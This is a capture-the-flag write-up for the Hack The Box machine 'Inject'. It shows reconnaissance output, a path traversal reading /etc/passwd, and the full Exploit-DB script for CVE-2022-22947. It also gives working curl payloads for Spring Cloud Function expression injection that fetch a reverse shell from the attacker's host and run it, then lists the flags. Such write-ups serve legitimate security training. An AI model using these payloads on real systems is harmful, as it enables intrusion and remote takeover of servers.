---
title: "HTB Writeup: Inject"
slug: "inject"
date: 2023-03-20T22:39:05-04:00
draft: false     
summary: "Writeup for Hack The Box – [Inject](https://app.hackthebox.com/machines/533)"     
description: "Writeup for Hack The Box – Inject" 
categories: ["htb"] 
tags: ["path traversal", "ssh"]       
keywords: ["htb","hackthebox","inject"]   
cover:
    image: "images/Inject.png"
---

## Inject
### nmap
```sh {linenos=true}
# Nmap 7.92 scan initiated Mon Mar 20 22:37:54 2023 as: nmap -sC -sV -oA nmap/inject -T4 10.10.11.204
Nmap scan report for 10.10.11.204
Host is up (0.029s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 ca:f1:0c:51:5a:59:62:77:f0:a8:0c:5c:7c:8d:da:f8 (RSA)
|   256 d5:1c:81:c9:7b:07:6b:1c:c1:b4:29:25:4b:52:21:9f (ECDSA)
|_  256 db:1d:8c:eb:94:72:b0:d3:ed:44:b9:6c:93:a7:f9:1d (ED25519)
8080/tcp open  nagios-nsca Nagios NSCA
|_http-title: Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Mar 20 22:38:05 2023 -- 1 IP address (1 host up) scanned in 10.33 seconds
```
### gobuster
```sh
gobuster dir -u http://10.10.11.204:8080 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -o gobuster
.out -z
```

```sh {linenos=true}
===============================================================
Gobuster v3.2.0-dev
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.11.204:8080
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.2.0-dev
[+] Timeout:                 10s
===============================================================
2023/03/20 23:20:09 Starting gobuster in directory enumeration mode
===============================================================
/upload               (Status: 200) [Size: 1857]
/blogs                (Status: 200) [Size: 5371]
/register             (Status: 200) [Size: 5654]
/error                (Status: 500) [Size: 106]
===============================================================
2023/03/20 23:20:56 Finished
===============================================================
```

### searchsploit
After a bit of trial and error, I discovered that the `/upload` page only accepts file extensions related to images. I attempted to upload malicious image files containing a PHP reverse shell, but this failed. Then I started to look and see if any of the programs running on the open ports were vulnerable with `metasploit`'s `searchsploit` CLI tool that allows users to search through known vulnerabilities within the Exploit Database.

```sh 
------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                             |  Path
------------------------------------------------------------------------------------------- ---------------------------------
Nagios 3.0.6 - 'statuswml.cgi' Arbitrary Shell Command Injection                           | cgi/remote/33051.txt
Nagios 3.2.3 - 'expand' Cross-Site Scripting                                               | multiple/remote/35818.txt
Nagios 4.2.2 - Local Privilege Escalation                                                  | linux/local/40774.sh
Nagios < 4.2.2 - Arbitrary Code Execution                                                  | linux/remote/40920.py
Nagios < 4.2.4 - Local Privilege Escalation                                                | linux/local/40921.sh
Nagios Core 4.4.1 - Denial of Service                                                      | linux/dos/45082.txt
Nagios Incident Manager 2.0.0 - Multiple Vulnerabilities                                   | php/webapps/40252.txt
Nagios Log Server 1.4.1 - Multiple Vulnerabilities                                         | php/webapps/40250.txt
Nagios Log Server 2.1.6 - Persistent Cross-Site Scripting                                  | multiple/webapps/48772.txt
Nagios Log Server 2.1.7 - Persistent Cross-Site Scripting                                  | multiple/webapps/49082.txt
Nagios Network Analyzer 2.2.0 - Multiple Vulnerabilities                                   | php/webapps/40251.txt
Nagios Network Analyzer 2.2.1 - Multiple Cross-Site Request Forgery Vulnerabilities        | php/webapps/40221.txt
Nagios Plugins 1.4.2/1.4.9 - Location Header Remote Buffer Overflow                        | linux/dos/30646.txt
Nagios Plugins check_dhcp 2.0.1 - Arbitrary Option File Read                               | linux/local/33387.txt
Nagios Plugins check_dhcp 2.0.2 - Arbitrary Option File Read Race Condition                | linux/local/33904.txt
Nagios Plugins check_ups - Local Buffer Overflow (PoC)                                     | linux/dos/18278.txt
Nagios Remote Plugin Executor - Arbitrary Command Execution (Metasploit)                   | linux/remote/24955.rb
Nagios XI - 'login.php' Multiple Cross-Site Scripting Vulnerabilities                      | linux/remote/34507.txt
Nagios XI - 'tfPassword' SQL Injection                                                     | php/remote/38827.txt
Nagios XI - 'users.php' SQL Injection                                                      | multiple/remote/34523.txt
Nagios XI - Authenticated Remote Command Execution (Metasploit)                            | linux/remote/48191.rb
Nagios XI - Multiple Cross-Site Request Forgery Vulnerabilities                            | linux/remote/34431.html
Nagios XI - Multiple Cross-Site Scripting / HTML Injection Vulnerabilities                 | multiple/remote/36455.txt
Nagios XI 5.2.6 < 5.2.9 / 5.3 / 5.4 - Chained Remote Root                                  | php/webapps/44560.py
Nagios XI 5.2.6-5.4.12 - Chained Remote Code Execution (Metasploit)                        | linux/remote/44969.rb
Nagios XI 5.2.7 - Multiple Vulnerabilities                                                 | php/webapps/39899.txt
Nagios XI 5.5.6 - Magpie_debug.php Root Remote Code Execution (Metasploit)                 | linux/remote/47039.rb
Nagios XI 5.5.6 - Remote Code Execution / Privilege Escalation                             | linux/webapps/46221.py
Nagios XI 5.6.1 - SQL injection                                                            | php/webapps/46910.txt
Nagios XI 5.6.12 - 'export-rrd.php' Remote Code Execution                                  | php/webapps/48640.txt
Nagios XI 5.6.5 - Remote Code Execution / Root Privilege Escalation                        | php/webapps/47299.php
Nagios XI 5.7.3 - 'Contact Templates' Persistent Cross-Site Scripting                      | php/webapps/48893.txt
Nagios XI 5.7.3 - 'Manage Users' Authenticated SQL Injection                               | php/webapps/48894.txt
Nagios XI 5.7.3 - 'mibs.php' Remote Command Injection (Authenticated)                      | php/webapps/48959.py
Nagios XI 5.7.3 - 'SNMP Trap Interface' Authenticated SQL Injection                        | php/webapps/48895.txt
Nagios XI 5.7.5 - Multiple Persistent Cross-Site Scripting                                 | php/webapps/49449.txt
Nagios XI 5.7.X - Remote Code Execution RCE (Authenticated)                                | php/webapps/49422.py
Nagios XI Chained - Remote Code Execution (Metasploit)                                     | linux/remote/40067.rb
Nagios XI Network Monitor Graph Explorer Component - Command Injection (Metasploit)        | unix/remote/23227.rb
Nagios3 - 'history.cgi' Host Command Execution (Metasploit)                                | linux/remote/24159.rb
Nagios3 - 'history.cgi' Remote Command Execution                                           | multiple/remote/24084.py
Nagios3 - 'statuswml.cgi' 'Ping' Command Execution (Metasploit)                            | cgi/webapps/16908.rb
Nagios3 - 'statuswml.cgi' Command Injection (Metasploit)                                   | unix/webapps/9861.rb
NagiosQL 2005 2.00 - 'prepend_adm.php' Remote File Inclusion                               | php/webapps/3919.txt
PHPNagios 1.2.0 - 'menu.php' Local File Inclusion                                          | php/webapps/9611.txt
------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Nothing proved useful here.

### burpsuite
I then started using `burpsuite` to see if anything weird was happening with the requests. Eventually, I realized that the query string (or URL parameter) was passing in the desired file. But can we specify any file? Seemed like a `path traversal` vulnerability could be present.

### curl
I then switched over to `curl` so I could perform this path injection from my terminal. First, I tested to see what would happen with my PHP reverse shell "image."
```sh
┌──(kali㉿kali)-[~/htb/inject]
└─$ curl "http://10.10.11.204:8080/show_image?img=shell.png"
{"timestamp":"2023-03-21T03:37:17.652+00:00","status":500,"error":"Internal Server Error","message":"URL [file:/var/www/WebApp/src/main/uploads/shell.png] cannot be resolved in the file system for checking its content length","path":"/show_image"}  
```

Right away, we can see the path to this file is output. Now let's try with something a little more spicy. 

```sh
┌──(kali㉿kali)-[~/htb/inject]
└─$ curl "http://10.10.11.204:8080/show_image?img=../../../../../../etc/passwd"                                             
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
frank:x:1000:1000:frank:/home/frank:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
sshd:x:113:65534::/run/sshd:/usr/sbin/nologin
phil:x:1001:1001::/home/phil:/bin/bash
fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
_laurel:x:997:996::/var/log/laurel:/bin/false
```

Some digging later, I found this interesting configuration file.

```sh
curl "http://10.10.11.204:8080/show_image?img=../../../../../www/WebApp/pom.xml" > pom.xml
```
*file: pom.xml*
```xml {linenos=true}
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
 xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd">
 <modelVersion>4.0.0</modelVersion>
 <parent>
  <groupId>org.springframework.boot</groupId>
  <artifactId>spring-boot-starter-parent</artifactId>
  <version>2.6.5</version>
  <relativePath/> <!-- lookup parent from repository -->
 </parent>
 <groupId>com.example</groupId>
 <artifactId>WebApp</artifactId>
 <version>0.0.1-SNAPSHOT</version>
 <name>WebApp</name>
 <description>Demo project for Spring Boot</description>
 <properties>
  <java.version>11</java.version>
 </properties>
 <dependencies>
  <dependency>
     <groupId>com.sun.activation</groupId>
     <artifactId>javax.activation</artifactId>
     <version>1.2.0</version>
  </dependency>
  <dependency>
   <groupId>org.springframework.boot</groupId>
   <artifactId>spring-boot-starter-thymeleaf</artifactId>
  </dependency>
  <dependency>
   <groupId>org.springframework.boot</groupId>
   <artifactId>spring-boot-starter-web</artifactId>
  </dependency>
  <dependency>
   <groupId>org.springframework.boot</groupId>
   <artifactId>spring-boot-devtools</artifactId>
   <scope>runtime</scope>
   <optional>true</optional>
  </dependency>
  <dependency>
   <groupId>org.springframework.cloud</groupId>
   <artifactId>spring-cloud-function-web</artifactId>
   <version>3.2.2</version>
  </dependency>
  <dependency>
   <groupId>org.springframework.boot</groupId>
   <artifactId>spring-boot-starter-test</artifactId>
   <scope>test</scope>
  </dependency>
  <dependency>
   <groupId>org.webjars</groupId>
   <artifactId>bootstrap</artifactId>
   <version>5.1.3</version>
  </dependency>
  <dependency>
   <groupId>org.webjars</groupId>
   <artifactId>webjars-locator-core</artifactId>
  </dependency>
 </dependencies>
 <build>
  <plugins>
   <plugin>
    <groupId>org.springframework.boot</groupId>
    <artifactId>spring-boot-maven-plugin</artifactId>
    <version>${parent.version}</version>
   </plugin>
  </plugins>
  <finalName>spring-webapp</finalName>
 </build>
</project>
```

### searchsploit
Now back to `searchsploit` to see if any of these plugins are vulnerable!

```sh
┌──(kali㉿kali)-[~/htb/inject]
└─$ searchsploit "spring cloud"
------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                             |  Path
------------------------------------------------------------------------------------------- ---------------------------------
Spring Cloud Config 2.1.x - Path Traversal (Metasploit)                                    | java/webapps/46772.rb
Spring Cloud Gateway 3.1.0 - Remote Code Execution (RCE)                                   | java/webapps/50799.py
------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Remote Code Execution (`RCE`) sounds very promising! We can learn more about the script via:

```sh
cat /usr/share/exploitdb/exploits/java/webapps/50799.py
```
This gives us the output of:

*file: 50799.py*

```python {linenos=true}
# Exploit Title: Spring Cloud Gateway 3.1.0 - Remote Code Execution (RCE)
# Google Dork: N/A
# Date: 03/03/2022
# Exploit Author: Carlos E. Vieira
# Vendor Homepage: https://spring.io/
# Software Link: https://spring.io/projects/spring-cloud-gateway
# Version: This vulnerability affect Spring Cloud Gateway < 3.0.7 & < 3.1.1
# Tested on: 3.1.0
# CVE : CVE-2022-22947

import random
import string
import requests
import json
import sys
import urllib.parse
import base64

headers = { "Content-Type": "application/json" , 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36','Accept' : '*/*'}
proxies = {
    'http': 'http://172.29.32.1:8081',
    'https': 'http://172.29.32.1:8081',
}
id = ''.join(random.choice(string.ascii_lowercase) for i in range(8))

def exploit(url, command):

    payload = { "id": id, "filters": [{ "name": "AddResponseHeader", "args": { "name": "Result", "value": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(\u0022"+command+"\u0022).getInputSt
ream()))}"}}],"uri": "http://example.com"}

    commandb64 =base64.b64encode(command.encode('utf-8')).decode('utf-8')

    rbase = requests.post(url + '/actuator/gateway/routes/'+id, headers=headers, data=json.dumps(payload), proxies=proxies, verify=False)
    if(rbase.status_code == 201):
        print("[+] Stage deployed to /actuator/gateway/routes/"+id)
        print("[+] Executing command...")
        r = requests.post(url + '/actuator/gateway/refresh', headers=headers, proxies=proxies, verify=False)
        if(r.status_code == 200):
            print("[+] getting result...")
            r = requests.get(url + '/actuator/gateway/routes/' + id, headers=headers, proxies=proxies, verify=False)
            if(r.status_code == 200):
                get_response = r.json()
                clean(url, id)
                return get_response['filters'][0].split("'")[1]
            else:
                print("[-] Error: Invalid response")
                clean(url, id)
                exit(1)
        else:
            clean(url, id)
            print("[-] Error executing command")


def clean(url, id):
    remove = requests.delete(url + '/actuator/gateway/routes/' + id, headers=headers, proxies=proxies, verify=False)
    if(remove.status_code == 200):
        print("[+] Stage removed!")
    else:
        print("[-] Error: Fail to remove stage")

def banner():
    print("""
    ###################################################
    #                                                 #
    #   Exploit for CVE-2022-22947                    #
    #   - Carlos Vieira (Crowsec)                     #
    #                                                 #
    #   Usage:                                        #
    #   python3 exploit.py <url> <command>            #
    #                                                 #
    #   Example:                                      #
    #   python3 exploit.py http://localhost:8080 'id' #
    #                                                 #
    ###################################################
    """)

def main():
    banner()
    if len(sys.argv) != 3:
        print("[-] Error: Invalid arguments")
        print("[-] Usage: python3 exploit.py <url> <command>")
        exit(1)
    else:
        url = sys.argv[1]
        command = sys.argv[2]
        print(exploit(url, command))
if __name__ == '__main__':
    main() 
```

After a lot of trial and error with running with `msfconsole` (the `Metasploit` CLI exploitation tool) as well as running the script locally, I finally gave up. Instead, I copied the portion of code responsible for the RCE and sent this via `curl`.

First I uploaded a reverse shell via a python HTTP server:

```sh
curl -X POST  http://10.10.11.204:8080/functionRouter -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("wget http://10.10.16.5:8000/oneline.rev -O /tmp/rev")' --data-raw 'data' -v
```

Then I executed this file to spring a shell locally. 
```sh
curl -X POST  http://10.10.11.204:8080/functionRouter -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("bash /tmp/rev")' --data-raw 'data' -v 
```
Once you have access, just grab the flags!

### Flags

**user.txt:** `b46c9409c9d255bb02c1fd45e4ccf79a`

**root.txt:** `074bddbe556da944009a1493fdb18615`